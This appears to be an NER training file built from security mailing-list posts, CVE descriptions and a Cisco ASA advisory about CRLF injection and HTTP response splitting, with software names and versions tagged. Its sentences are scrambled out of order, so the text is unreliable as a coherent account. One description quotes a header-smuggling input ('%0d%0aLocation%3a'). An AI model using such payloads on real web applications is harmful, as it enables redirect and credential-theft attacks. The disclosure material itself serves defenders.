DOTACUJF5M+DZTq2uGvt/5T4EoO4Nk/h7v/KjpjwZjKvvxbca5/zD7aBzBRvBwpO O
ObDZcFwigZea4mYbOic1zE4uVb7Wzq9c/WUV9REI4ZAa1nbNAI3RaxS0ONWmiZOn O
2jSUylOEi0TpjyQCN68WQHnWhbVpEQ0SycUdagykBWHCOJm7Xpx4vFp8bbSSZaTS O
+Ot4A2E2OfLGAoE13rfN O
=6/g3 O
END O
PGP O
SIGNATURE O

Please O
use O
CVE-2012-5572 O
for O
this O
issue O
. O

Subject O
: O
Re O
: O
CVE O
Request O
Dancer.pm O
perl-Dancer O
libdancer-perl O
: O
Newline O
injection O
due O
to O
improper O
CRLF O
escaping O
in O
cookie O
( O
) O
and O
cookies O
( O
) O
methods O
( O
different O
vulnerability O
than O
CVE-2012-5526 O
) O

NOTE O
: O
this O
vulnerability O
exists O
because O
of O
an O
incorrect O
fix O
for O
CVE-2011-1398 O
. O

The O
sapi_header_op O
function O
in O
main/SAPI.c O
in O
PHP SN
5.4.0RC2 SV
through SV
5.4.0 SV
does O
not O
properly O
determine O
a O
pointer O
during O
checks O
for O
% O
0D O
sequences O
( O
aka O
carriage O
return O
characters O
) O
, O
which O
allows O
remote O
attackers O
to O
bypass O
an O
HTTP O
response-splitting O
protection O
mechanism O
via O
a O
crafted O
URL O
, O
related O
to O
improper O
interaction O
between O
the O
PHP O
header O
function O
and O
certain O
browsers O
, O
as O
demonstrated O
by O
Internet O
Explorer O
and O
Google O
Chrome O
. O

Back O
when O
they O
were O
reported O
, O
I O
had O
assigned O
the O
following O
id O
: O
CVE-2011-1398 O
header O
injection O
detection O
bypass O
. O

Note O
that O
the O
id O
only O
applies O
to O
the O
CR O
bypass O
part O
of O
the O
issue O
. O

Subject O
: O
php O
header O
( O
) O
header O
injection O
detection O
bypass O

Then O
it O
came O
this O
other O
report O
( O
60227 O
, O
originally O
reported O
as O
60028 O
by O
the O
same O
person O
but O
tagged O
security O
, O
which O
hid O
it O
too O
) O
, O
which O
lead O
to O
finally O
fixing O
the O
bug O
( O
but O
please O
beware O
of O
the O
original O
fix O
by O
reading O
) O
. O

Please O
do O
correct O
me O
if O
I O
m O
wrong O
. O

Hi O
, O
Reviewing O
a O
list O
of O
CVE O
ids O
that O
were O
assigned O
from O
the O
Debian O
CNA O
pool O
, O
I O
noticed O
there O
is O
one O
[ O
id O
] O
for O
php5 O
that O
hasn O
t O
been O
made O
public O
yet O
the O
issue O
has O
already O
been O
re-re-reported O
and O
in O
this O
one O
last O
round O
finally O
fixed O
. O

Cheers O
, O
Raphael O
Geissert O
- O
Debian O
Developer O
- O
get.debian.net O

Date O
: O
Wed O
, O
29 O
Aug O
2012 O
13:26:34 O
-0500 O
From O
: O
Raphael O
Geissert O
< O
geissert O
@ O
... O
ian.org O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

I O
m O
talking O
about O
It O
was O
independently O
reported O
by O
two O
persons O
but O
as O
of O
this O
time O
their O
reports O
( O
54182 O
and O
54006 O
) O
are O
still O
hidden O
behind O
the O
security O
bug O
curtain O
of O
PHP O
bug O
tracker O
. O

Unless O
I O
missed O
something O
, O
the O
CR O
bypass O
issue O
was O
never O
assigned O
a O
CVE O
id O
once O
it O
became O
public O
. O

( O
referenced O
from O
60227 O
) O
This O
is O
perfect O
, O
thanks O
. O

Please O
use O
CVE-2012-4388 O
for O
the O
incomplete O
fix O
for O
CVE-2011-1398 O
. O

1 O
) O
I O
don O
t O
see O
54182 O
and O
54006 O
in O
the O
PHP O
ChangeLog O
, O
have O
these O
been O
fixed O

( O
this O
would O
be O
easier O
if O
the O
old O
bug O
entries O
were O
public O
= O
) O
. O

The O
non- O
public O
ones O
have O
been O
marked O
as O
duplicates O
of O
the O
public O
one O
. O

I O
m O
aware O
of O
at O
least O
5.4.0 O
RC5 O
containing O
the O
incomplete O
fix O
, O
but O
I O
don O
t O
know O
in O
which O
exact O
RC O
version O
it O
made O
its O
way O
into O
. O

Kurt O
, O
could O
you O
please O
assign O
one O

Please O
let O
me O
know O
if O
it O
not O
clear O
enough O
yet O
. O

[ O
... O
] O
2 O
) O
Are O
you O
saying O
that O
the O
header O
injection O
detection O
bypass O
wasn O
t O
completely O
fixed O
by O
the O
patches O
for O
54182 O
and O
54006 O
, O
and O
then O
someone O
reported O
60227 O
, O
originally O
reported O
as O
60028 O
which O
has O
been O
fixed O
needs O
a O
second O
CVE O
( O
e.g O
. O

Cheers O
, O
- O
Kurt O
Seifried O
Red O
Hat O
Security O
Response O
Team O
( O
SRT O
) O
PGP O
: O
0x5E267993 O
A90B O
F995 O
7350 O
148F O
66BF O
7554 O
160D O
4553 O
5E26 O
7993 O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.12 O
( O
GNU/Linux O
) O

Date O
: O
Sat O
, O
01 O
Sep O
2012 O
20:01:38 O
-0600 O
From O
: O
Kurt O
Seifried O
< O
kseifried O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
CC O
: O
Raphael O
Geissert O
< O
geissert O
@ O
... O
ian.org O

All O
the O
bug O
reports O
I O
mentioned O
are O
about O
exactly O
the O
same O
issue O
. O

Comment O
: O
Using O
GnuPG O
with O
Mozilla O
- O
iQIcBAEBAgAGBQJQQr4CAAoJEBYNRVNeJnmT8fgP/j8WIOL6loD6wXovpCS1gwlj O
A/wkadlal5XgFQ01MJaJnjy9p+CkztoofUjMuwGIkJHhDsvvBVzE8w9pbSNhoZfn O
FMX9m2sP3VAuD5vyTizkmlC4hH3/OufAnglJaLxENa+MX0nUhtkzOnd8g9PA/aLG O
9pMjCZBcsL2GPN8C3XrokIao3LwyDTUT1aamOGJKcY3bw439NTZjSzk3cAP8nCPA O
FvwZsAuZ8Hout4V8szmTJr6yLx6OfA5Al44dhFqjUEuHKTZSpUDbR86UOByrO9fJ O
ALPxX7Z8JmHD3EiiSs4BgTfubd783ovONdSUJsiNFidQoYlna8mPpw9Qgt692sSR O
n2KXHk958mujRR6/Bc1lds6FdT7Qg+4usOs8cj3VVltDc+UpKm4oBTZ+jbnl+TQo O
iXfQGpWzwZ/caOAoozBpUikVZlZdT6xu2PfLrwSiqVZ+MRvD1p07IWWHMEeNma7c O
FZtE4OsmtmYaSX/xSkgPBLIzLjOlVJdkH4694ACuhiR62iwxy2vvLYqGx2+Spmzg O
WXJ5iLF/QHyJFJZYFostGtOaIGqW9b9GLHve8f0xyhneJRRi7Tw5h0A14GhHEbpY O
lH37OTKZ0oKVUErLpXlw8zblwsrgUWJPcJpIRkdvxz9li33FOY7jasSKsJGXhOYl O
L+x3hnfMOaRizpGA40nK O
=knYF O
END O
PGP O
SIGNATURE O

5.4.0 SV
beta2 SV
was O
still O
vulnerable O
to O
CVE-2011-1398 O
. O

the O
an O
incomplete O
fix O
for O
original O
issue O
led O
to O
a O
second O
fix O
being O
pushed O
thing O
) O

So O
, O
since O
at O
least O
PHP SN
5.4.0 SV
had O
the O
incomplete O
fix O
, O
I O
guess O
a O
new O
CVE O
for O
the O
incomplete O
fix O
is O
in O
order O
. O

PHP O
5.4.1 O
RC1 O
already O
had O
the O
proper O
fix O
. O

Subject O
: O
Re O
: O
php O
header O
( O
) O
header O
injection O
detection O
bypass O

[ O
new O
CVE-2012-4388 O
description O
] O
The O
sapi_header_op O
function O
in O
main/SAPI.c O
in O
PHP SN
5.4.0RC2 SV
through SV
5.4.0 SV
does O
not O
properly O
determine O
a O
pointer O
during O
checks O
for O
% O
0D O
sequences O
( O
aka O
carriage O
return O
characters O
) O
, O
which O
allows O
remote O
attackers O
to O
bypass O
an O
HTTP O
response-splitting O
protection O
mechanism O
via O
a O
crafted O
URL O
, O
related O
to O
improper O
interaction O
between O
the O
PHP O
header O
function O
and O
certain O
browsers O
, O
as O
demonstrated O
by O
Internet O
Explorer O
and O
Google O
Chrome O
. O

Note O
2 O
: O

Date O
: O
Wed O
, O
5 O
Sep O
2012 O
13:05:43 O
-0400 O
( O
EDT O
) O
From O
: O
cve-assign O
@ O
... O
re.org O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
cve-assign O
@ O
... O
re.org O

In O
the O
actual O
situation O
, O
the O
patch O
had O
a O
logic O
flaw O
related O
to O
the O
( O
( O
p O
= O
memchr O
( O
s O
e O
- O
s O
p O
= O
memchr O
( O
s O
e O
- O
s O
) O
) O
) O
) O
expression O
. O

Specifically O
, O
we O
don O
t O
know O
whether O
there O
a O
supported O
download O
location O
for O
every O
pre-release O
version O
that O
ever O
existed O
, O
but O
we O
happened O
to O
find O
the O
directory O
. O

Here O
, O
5.4.0alpha3 SV
( O
August O
2011 O
) O
does O
not O
check O
for O
at O
all O
, O
whereas O
5.4.0RC2 O
( O
December O
2011 O
) O
can O
check O
for O
but O
has O
the O
above-mentioned O
logic O
flaw O
. O

If O
this O
were O
the O
case O
, O
the O
second O
CVE O
description O
would O
mention O
an O
incomplete O
fix O
for O
the O
first O
CVE O
. O

This O
is O
consistent O
with O
the O
2011-11-06 O
SVN O
date O
listed O
in O
bug O
60227 O
. O

- O
CVE O
assignment O
team O
, O
MITRE O
CVE O
Numbering O
Authority O
M/S O
M300 O
202 O
Burlington O
Road O
, O
Bedford O
, O
MA O
01730 O
USA O
[ O
PGP O
key O
available O
through O
] O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.11 O
( O
SunOS O
) O
iQEcBAEBAgAGBQJQR4VAAAoJEGvefgSNfHMdT2cIAKLrbO/VRVzYstBpTXdDWe/i O
n7h1ihiDHjClMClApGx6EfzGgZ5sueAtFUkDvbxjp1yvCBYTmioOpAuaXZKEFXk2 O
EgTYrNrPIRMpss0FnM+6ORVnnfZh7TlfipHnkICYLjbf901R02ijxVseeK4IkIlJ O
CN65rm65hu2qb/rdCeei/buTv+cp77xdZCkO+NeAj4VmC14/eVtTbXP5pkG73kxG O
OLkL9oQY/Inbdi2jR5oIHBKSW6EG2Nu9kXO6uX1L6FPcxTGN1TiRhKZo6pLicYg6 O
CCiiCAR8hIB1+v1gLi8R0JfBBxF9q1LbyjnrowGNitiq305QSptBA1zLe2977O8= O
=cX+c O
END O
PGP O
SIGNATURE O

We O
originally O
thought O
that O
there O
was O
interest O
in O
separate O
CVE O
IDs O
for O
the O
header O
function O
is O
unsafe O
when O
a O
URL O
contains O
any O
recognized O
end-of-line O
character O
and O
the O
header O
function O
is O
unsafe O
when O
a O
URL O
contains O
a O
% O
0D O
sequence O
. O

We O
probably O
haven O
t O
found O
the O
exact O
affected O
5.4.0RC SV
versions O
, O
but O
this O
doesn O
t O
matter O
much O
because O
those O
versions O
aren O
t O
widely O
used O
. O

But O
, O
we O
now O
understand O
that O
the O
first O
CVE O
is O
not O
wanted O
at O
all O
, O
which O
seems O
reasonable O
. O

Subject O
: O
Re O
: O
php O
header O
( O
) O
header O
injection O
detection O
bypass O
BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
> O
To O
me O
, O
this O
is O
what O
each O
of O
the O
ids O
represent O
: O
> O
CVE-2011-1398 O
: O
describes O
the O
protection O
bypass O
> O
CVE-2012-4388 O
: O
describes O
the O
failure O
to O
fully O
fix O
the O
protection O
bypass O
> O
( O
hence O
the O
incomplete O
fix O
for O
CVE-2011-1398 O
) O
OK O
, O
what O
seems O
best O
at O
this O
point O
is O
the O
following O
: O
[ O
revised O
CVE-2011-1398 O
description O
] O
The O
sapi_header_op O
function O
in O
main/SAPI.c O
in O
PHP SN
before SV
5.3.11 SV
and SV
5.4.x SV
before SV
5.4.0RC2 SV
does O
not O
check O
for O
% O
0D O
sequences O
( O
aka O
carriage O
return O
characters O
) O
, O
which O
allows O
remote O
attackers O
to O
bypass O
an O
HTTP O
response-splitting O
protection O
mechanism O
via O
a O
crafted O
URL O
, O
related O
to O
improper O
interaction O
between O
the O
PHP O
header O
function O
and O
certain O
browsers O
, O
as O
demonstrated O
by O
Internet O
Explorer O
and O
Google O
Chrome O
. O

Admittedly O
, O
for O
many O
CVE O
users O
it O
doesn O
t O
matter O
. O

MITRE O
prefers O
to O
categorize O
this O
type O
of O
situation O
as O
an O
incorrect O
fix O
not O
an O
incomplete O
fix O
. O

Note O
1 O
: O

The O
mapping O
of O
the O
two O
CVEs O
to O
a O
vendor O
changelog O
is O
currently O
problematic O
because O
has O
two O
very O
similar O
references O
to O
Fixed O
bug O
60227 O
but O
one O
of O
the O
listed O
versions O
( O
5.4.0 O
) O
has O
the O
code O
change O
with O
the O
above-mentioned O
logic O
flaw O
, O
whereas O
the O
other O
( O
5.3.11 O
) O
has O
a O
different O
code O
change O
without O
this O
logic O
flaw O
. O

Date O
: O
Thu O
, O
6 O
Sep O
2012 O
20:56:24 O
-0500 O
From O
: O
Raphael O
Geissert O
< O
geissert O
@ O
... O
ian.org O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

Subject O
: O
Re O
: O
Re O
: O
php O
header O
( O
) O
header O
injection O
detection O
bypass O

Since O
RCs O
and O
alphas O
are O
published O
in O
user O
dirs O
, O
and O
not O
in O
the O
main O
release O
system O
, O
I O
don O
t O
think O
they O
are O
actively O
archived O
. O

You O
are O
indeed O
right O
, O
it O
is O
is O
better O
to O
categorize O
it O
as O
an O
incorrect O
fix O
. O

However O
, O
taking O
a O
look O
at O
the O
5.4.0RC1 O
tag O
in O
git O
, O
it O
seems O
the O
issue O
was O
indeed O
introduced O
in O
RC2 O
: O
And O
to O
confirm O
it O
in O
RC2 O
: O
Regards O
, O
Raphael O
Geissert O
- O
Debian O
Developer O
- O
get.debian.net O

CRLF O
injection O
vulnerability O
in O
IBM SN
Maximo SN
Asset SN
Management SN
7.x SV
before SV
7.5.0.6 SV
and O
SmartCloud SN
Control SN
Desk SN
7.x SV
before SV
7.5.0.3 SV
and SV
7.5.1.x SV
before SV
7.5.1.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
parameter O
in O
a O
URL O
. O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
the O
HTTP O
server O
in O
IBM SN
Lotus SN
Domino SN
8.5.x SV
before SV
8.5.4 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
crafted O
input O
involving O
( O
1 O
) O
Mozilla SN
Firefox SN
3.0.9 SV
and SV
earlier SV
or O
( O
2 O
) O
unspecified O
browsers O
. O

CRLF O
injection O
vulnerability O
in O
the O
Browser O
in O
Adobe SN
ColdFusion SN
8.0 SV
through SV
9.0.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
Cogent SN
DataHub SN
7.1.2 SV
and SV
earlier SV
, O
Cascade SN
DataHub SN
6.4.20 SV
and SV
earlier SV
, O
and O
OPC SN
DataHub SN
6.4.20 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
calendar/set.php O
in O
the O
Calendar O
subsystem O
in O
Moodle SN
1.9.x SV
before SV
1.9.15 SV
, O
2.0.x SV
before SV
2.0.6 SV
, O
and SV
2.1.x SV
before SV
2.1.3 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
admin/displayImage.php O
in O
Prestashop SN
1.4.4.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
name O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
/+CSCOE+/logon.html O
on O
Cisco SN
Adaptive SN
Security SN
Appliances SN
( O
ASA SN
) O
5500 SN
series SN
devices SN
with O
software O
8.0 SV
through SV
8.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
, O
aka O
Bug O
ID O
CSCth63101 O
. O

CRLF O
injection O
vulnerability O
in O
the O
logout O
functionality O
in O
VMware SN
SpringSource SN
Spring SN
Security SN
before SV
2.0.7 SV
and SV
3.0.x SV
before SV
3.0.6 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
spring-security-redirect O
parameter O
. O

The O
sapi_header_op O
function O
in O
main/SAPI.c O
in O
PHP SN
before SV
5.3.11 SV
and SV
5.4.x SV
before SV
5.4.0RC2 SV
does O
not O
check O
for O
% O
0D O
sequences O
( O
aka O
carriage O
return O
characters O
) O
, O
which O
allows O
remote O
attackers O
to O
bypass O
an O
HTTP O
response-splitting O
protection O
mechanism O
via O
a O
crafted O
URL O
, O
related O
to O
improper O
interaction O
between O
the O
PHP O
header O
function O
and O
certain O
browsers O
, O
as O
demonstrated O
by O
Internet O
Explorer O
and O
Google O
Chrome O
. O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
Adobe SN
ColdFusion SN
8.0 SV
through SV
9.0.1 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
tags O
. O

CRLF O
injection O
vulnerability O
in O
TransWARE SN
Active SN
mail SN
6 SV
build SV
6.40.010047750 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

The O
multipart_init O
function O
in O
( O
1 O
) O
CGI.pm SN
before SV
3.50 SV
and O
( O
2 O
) O
Simple.pm SN
in O
CGI O
: O
:Simple O
1.112 SV
and SV
earlier SV
uses O
a O
hardcoded O
value O
of O
the O
MIME O
boundary O
string O
in O
multipart/x-mixed-replace O
content O
, O
which O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
crafted O
input O
that O
contains O
this O
value O
, O
a O
different O
vulnerability O
than O
CVE-2010-3172 O
. O

Steve O
, O
could O
you O
please O
allocate O
CVE O
id O
for O
this O

Attackers O
can O
inject O
boundary O
of O
multipart/x-mixed-replace O
. O

Hi O
Steve O
, O
vendors O
, O
Masahiro O
Yamada O
reported O
: O
the O
following O
deficiency O
( O
from O
) O
: O
Search O
result O
of O
b.m.o O
. O

( O
id O
2 O
) O
Yet O
, O
back O
to O
CVE-2010-3172 O
, O
Masahiro O
mentions O
in O
, O
that O
perl-CGI-Simple O
is O
prone O
to O
same O
deficiency O
, O
as O
CVE-2010-3172 O
in O
Bugzilla O
was O
: O
Looks O
, O
like O
it O
was O
already O
fixed O
in O
perl-CGI-Simple O
too O
: O
Relevant O
perl-CGi-Simple O
patch O
: O
Steve O
, O
could O
you O
allocate O
new O
CVE O
id O
for O
this O
issue O

Steve O
, O
could O
you O
please O
allocate O
one O

It O
may O
be O
able O
to O
be O
used O
for O
HTTP O
Header O
injection O
. O

An O
exception O
is O
thrown O
if O
header O
values O
contain O
invalid O
newlines O
. O

Further O
improvements O
to O
handling O
of O
newlines O
embedded O
in O
header O
values O
. O

Is O
it O
related O
to O
CVE-2010-3172 O

The O
MIME O
boundary O
in O
multipart_init O
is O
now O
random O
Thanks O
to O
Byron O
Jones O
, O
Masahiro O
Yamada O
, O
Reed O
Loden O
, O
and O
Mark O
Stosberg O
Since O
perl-CGi O
is O
different O
code O
base O
than O
Bugzilla O
, O
we O
suspect O
a O
new O
CVE O
id O
is O
required O
for O
this O
issue O

Date O
: O
Wed O
, O
01 O
Dec O
2010 O
18:28:55 O
+0100 O
From O
: O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
To O
: O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O
CC O
: O
oss-security O
< O
oss-security O
@ O
... O
ts.openwall.com O
> O
, O
Marcela O
Maslanova O
< O
mmaslano O
@ O
... O
hat.com O
> O
, O
Petr O
Pisar O
< O
ppisar O
@ O
... O
hat.com O
> O
, O
Chris O
BinGOs O
Williams O
< O
chris O
@ O
... O
gosnet.co.uk O
> O
, O
Reed O
Loden O
< O
reed O
@ O
... O
dloden.com O
> O
, O
Masahiro O
Yamada O
< O
masa141421356 O
@ O
... O
il.com O
> O
, O
Byron O
Jones O
< O
glob O
@ O
... O
b.com.au O
> O
, O
Mark O
Stosberg O
< O
mark O
@ O
... O
mersault.com O

does O
not O
escape O
=_aaaaaaaaaa0 O
: O
it O
is O
used O
as O
boudary O
of O
multipart/x-mixed-replace O
. O

Subject O
: O
CVE O
Request O
perl-CGI O
two O
ids O
, O
perl-CGI-Simple O
one O
id O
( O
CVE-2010-3172 O
already O
assigned O
for O
Bugzilla O
part O
) O

Thanks O
to O
Michal O
Zalewski O
, O
Max O
Kanat-Alexander O
, O
Yanick O
Champoux O
Lincoln O
Stein O
, O
Frederic O
Buclin O
and O
Mark O
Stosberg O
Chris O
, O
Mark O
, O
could O
you O
please O
provide O
more O
details O
about O
the O
issue O

( O
id O
3 O
) O
Thanks O
& O
& O
Regards O
, O
Jan. O
Jan O
iankko O
Lieskovsky O
Red O
Hat O
Security O
Response O
Team O

Once O
CGI.pm O
has O
a O
final O
update O
to O
address O
the O
remaining O
header O
injection O
issue O
, O
I O
ll O
share O
the O
same O
patch O
with O
CGI O
: O
:Simple O
. O

A O
new O
patch O
has O
been O
developed O
, O
and O
is O
currently O
pending O
review O
and O
acceptance O
by O
the O
primary O
CGI.pm O
author O
, O
Lincoln O
Stein O
. O

( O
id O
1 O
) O
CGI.pm O
is O
used O
by O
the O
Bugzilla O
code O
base O
. O

However O
, O
Bugzilla O
may O
not O
always O
be O
vulnerable O
to O
issues O
in O
CGI.pm O
depending O
on O
they O
use O
it O
. O

( O
Now O
CC O
ed O
) O
. O

However O
, O
later O
testing O
found O
that O
the O
issue O
wasn O
t O
completely O
fixed O
in O
3.50 SV
. O

Subject O
: O
Re O
: O
CVE O
Request O
perl-CGI O
two O
ids O
, O
perl-CGI-Simple O
one O
id O
( O
CVE-2010-3172 O
already O
assigned O
for O
Bugzilla O
part O
) O
Since O
perl-CGi O
is O
different O
code O
base O
than O
Bugzilla O
, O
we O
suspect O
a O
new O
CVE O
id O
is O
required O
for O
this O
issue O

Yes O
, O
it O
is O
. O

Subject O
: O
Re O
: O
CVE O
Request O
perl-CGI O
two O
ids O
, O
perl-CGI-Simple O
one O
id O
( O
CVE-2010-3172 O
already O
assigned O
for O
Bugzilla O
part O
) O

( O
id O
2 O
) O
Mozilla O
already O
allocated O
CVE-2010-2761 O
to O
this O
part O
for O
the O
perl-CGI O
issue O
. O

~reed O
Mozilla O
Security O
Group O
Reed O
Loden O
reed O
@ O
... O
dloden.com O

Date O
: O
Wed O
, O
1 O
Dec O
2010 O
10:55:33 O
-0800 O
From O
: O
Reed O
Loden O
< O
reed O
@ O
... O
dloden.com O
To O
: O
Mark O
Stosberg O
< O
mark O
@ O
... O
mersault.com O
Cc O
: O
oss-security O
< O
oss-security O
@ O
... O
ts.openwall.com O
> O
, O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
> O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O
> O
, O
Marcela O
Maslanova O
< O
mmaslano O
@ O
... O
hat.com O
> O
, O
Petr O
Pisar O
< O
ppisar O
@ O
... O
hat.com O
> O
, O
Chris O
BinGOs O
Williams O
< O
chris O
@ O
... O
gosnet.co.uk O
> O
, O
Masahiro O
Yamada O
< O
masa141421356 O
@ O
... O
il.com O
> O
, O
Byron O
Jones O
< O
glob O
@ O
... O
b.com.au O
> O
, O
Lincoln O
Stein O
< O
lincoln.stein O
@ O
... O
il.com O

CRLF O
injection O
vulnerability O
in O
CGI SN
RESCUE SN
Web SN
Mailer SN
before SV
1.04 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
, O
and O
conduct O
cross-site O
scripting O
( O
XSS O
) O
or O
HTTP O
response O
splitting O
attacks O
, O
via O
CRLF O
sequences O
in O
an O
unspecified O
web O
form O
. O

CRLF O
injection O
vulnerability O
in O
da/DA/Login O
in O
Sun SN
Java SN
System SN
Delegated SN
Administrator SN
6.2 SV
through SV
6.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
HELP_PAGE O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
bs_disp_as_mime_type.php O
in O
the O
BLOB O
streaming O
feature O
in O
phpMyAdmin SN
before SV
3.1.3.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
( O
1 O
) O
c_type O
and O
possibly O
( O
2 O
) O
file_type O
parameters O
. O

CRLF O
injection O
vulnerability O
in O
+webvpn+/index.html O
in O
WebVPN O
on O
Cisco SN
Adaptive SN
Security SN
Appliances SN
( O
ASA SN
) O
5580 SN
series SN
devices SN
with O
software O
before SV
8.1 SV
( O
2 SV
) O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
as O
demonstrated O
by O
a O
redirect O
attack O
involving O
a O
% O
0d O
% O
0aLocation O
% O
3a O
sequence O
in O
a O
URI O
, O
or O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
, O
aka O
Bug O
ID O
CSCsr09163 O
. O

The O
combination O
of O
deep O
security O
knowledge O
and O
expertise O
, O
purpose-built O
security O
technology O
and O
processes O
and O
excellent O
client O
service O
makes O
SecureWorks O
the O
premier O
provider O
of O
information O
security O
services O
. O

is O
listed O
in O
the O
Release O
Notes O
: O
CSCsr09163 O
webvpn O
- O
+webvpn+/index.html O
http O
response O
splitting O
problem O
. O

The O
information O
within O
this O
advisory O
may O
change O
without O
notice O
. O

There O
are O
NO O
warranties O
, O
implied O
or O
otherwise O
, O
with O
regard O
to O
this O
information O
or O
its O
use O
. O

Release O
Notes O
are O
available O
at O
: O
2.html O
The O
following O
Resolved O
Caveat O

The O
CTU O
frequently O
serves O
as O
an O
expert O
resource O
for O
the O
media O
, O
publishes O
technical O
analyses O
for O
the O
security O
community O
and O
speaks O
about O
emerging O
threats O
at O
security O
conferences O
. O

Details O
When O
a O
user O
connects O
to O
the O
web O
interface O
of O
the O
ASA O
via O
HTTP O
, O
they O
are O
automatically O
redirected O
to O
the O
SSL O
encrypted O
version O
. O

This O
process O
enables O
the O
CTU O
to O
identify O
threats O
as O
they O
emerge O
and O
develop O
countermeasures O
that O
protect O
our O
clients O
before O
damage O
occurs O
. O

Use O
of O
this O
information O
constitutes O
acceptance O
for O
use O
in O
an O
AS O
IS O
condition O
. O

Vendor O
Information O
, O
Solutions O
and O
Workarounds O
Cisco O
has O
released O
a O
fix O
to O
address O
this O
security O
flaw O
. O

Leveraging O
this O
attack O
could O
lead O
to O
stolen O
credentials O
and O
access O
to O
the O
VPN O
. O

About O
SecureWorks O
SecureWorks O
is O
a O
leading O
provider O
of O
world-class O
information O
security O
services O
with O
over O
2,800 O
clients O
worldwide O
. O

Organizations O
of O
all O
sizes O
, O
including O
more O
than O
ten O
percent O
of O
the O
Fortune O
500 O
, O
rely O
on O
SecureWorks O
to O
protect O
their O
assets O
, O
support O
compliance O
and O
reduce O
costs O
. O

Disclaimer O
Copyright O
xc2 O
xa9 O
2010 O
SecureWorks O
, O
Inc O
. O

SecureWorks O
Security O
Advisory O
SWRX-2010-001 O
Cisco O
ASA O
HTTP O
Response O
Splitting O
Vulnerability O
Advisory O
Information O
Title O
: O
Cisco O
ASA O
HTTP O
Response O
Splitting O
Vulnerability O
Advisory O
ID O
: O
SWRX-2010-001 O
Advisory O
URL O
: O
Date O
published O
: O
Thursday O
, O
June O
24 O
, O
2010 O
CVE O
: O
CVE-2008-7257 O
CVSS O
v2 O
Base O
Score O
: O
5 O
( O
Medium O
) O
( O
AV O
: O
N/AC O
: O
L/Au O
: O
N/C O
: O
N/I O
: O
P/A O
: O
N O
) O
Date O
of O
last O
update O
: O
Thursday O
, O
June O
24 O
, O
2010 O

Impact O
( O
scale O
of O
1-5 O
, O
with O
5 O
being O
high O
) O
: O
4 O

Leveraging O
our O
security O
technologies O
and O
a O
network O
of O
industry O
contacts O
, O
the O
CTU O
tracks O
leading O
hackers O
and O
analyzes O
anomalous O
activity O
, O
uncovering O
new O
attack O
techniques O
and O
threats O
. O

Positioned O
in O
the O
Leader O
Quadrant O
of O
Gartner O
Magic O
Quadrant O
for O
MSSPs O
, O
SecureWorks O
has O
been O
recognized O
by O
SC O
Magazine O
readers O
with O
the O
Best O
Managed O
Security O
Service O

award O
for O
2006 O
, O
2007 O
, O
2008 O
& O
2009 O
and O
has O
been O
named O
to O
the O
Inc. O
500 O
, O
Inc. O
5000 O
and O
Deloitte O
lists O
of O
fastest-growing O
companies O
. O

If O
you O
wish O
to O
reprint O
this O
advisory O
or O
any O
portion O
or O
element O
thereof O
, O
please O
contact O
ctu O
( O
at O
) O
secureworks O
( O
dot O
) O
com O
[ O
email O
concealed O
] O
to O
seek O
permission O
. O

In O
no O
event O
shall O
SecureWorks O
be O
liable O
for O
any O
damages O
whatsoever O
arising O
out O
of O
or O
in O
connection O
with O
the O
use O
or O
spread O
of O
this O
information O
. O

This O
device O
is O
designed O
to O
be O
on O
the O
perimeter O
